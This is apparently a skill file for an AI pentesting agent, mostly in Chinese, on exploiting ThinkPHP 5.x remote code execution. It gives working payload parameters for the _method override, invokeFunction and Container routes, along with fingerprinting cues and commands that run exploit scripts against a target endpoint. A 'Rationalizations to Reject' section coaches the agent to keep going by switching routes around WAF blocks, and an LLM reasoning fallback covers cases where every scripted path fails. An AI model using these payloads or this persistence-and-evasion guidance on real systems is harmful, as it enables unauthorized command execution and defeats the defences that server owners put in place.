---
name: thinkphp-rce
description: Exploits ThinkPHP 5.x multiple RCE vulnerabilities including _method override, invokeFunction route call, and Container injection. Use when target runs ThinkPHP 5.x framework with debug mode or exposed routing.
skill_type: exploit
severity: critical
tags: [php, thinkphp, rce, method-override, invokeFunction]
---

# ThinkPHP 远程命令执行

## Essential Principles

1. **_method 覆盖 RCE（5.0.x）**：`_method=__construct` 覆盖 Request 属性，设 `filter=system`，通过 `server[REQUEST_METHOD]=id` 触发 `call_user_func`
2. **invokeFunction RCE**：兼容模式路由 `s=/index/\think\app/invokefunction` 直接调用 `call_user_func_array`
3. **Container RCE（5.1.x）**：`\think\Container/invokefunction` 路径同样可调用任意函数
4. **检测特征**：响应头 `X-Powered-By: ThinkPHP`、错误信息含 ThinkPHP 特征

## When to Use

- 响应头含 ThinkPHP 指纹
- `/index.php?s=/xxx` 可访问且有响应
- 扫描器报告 ThinkPHP RCE 漏洞
- `_method=__construct` 特征未被 WAF 拦截

## When NOT to Use

- ThinkPHP 6.x 或已最新补丁的 5.x 版本
- 路由严格匹配预定义的 controller/action
- WAF 拦截 `\think\` 命名空间特征

## Rationalizations to Reject

- "_method 被 WAF 拦截" -> 换 invokeFunction 路径，绕过 WAF
- "5.0.x payload 对 5.1.x 无效" -> 自动降级到 invoke_51 / Container 路径
- "路由返回 404" -> 试不同的 payload 路由组合，部分环境需要 index.php

## Path Selection

| 条件 | 路径 | 方法 |
|------|------|------|
| ThinkPHP 确认 | **A: method_override** | _method=__construct filter=system RCE |
| method_override 失败 | **B: invoke_function** | invokeFunction / Container RCE |
| 全部失败 | **C: LLM 兜底** | ReAct 自由推理 |

## Quick Start

```bash
# 1. 确认 ThinkPHP 框架
bash {skill_dir}/scripts/probe_thinkphp.sh {ENDPOINT}

# 2. _method 覆盖 RCE
bash {skill_dir}/scripts/method_override_rce.sh {ENDPOINT} captcha

# 3. invokeFunction RCE
bash {skill_dir}/scripts/invoke_function_rce.sh {ENDPOINT}

# 4. 5.1.x Container RCE
bash {skill_dir}/scripts/container_rce.sh {ENDPOINT}
```
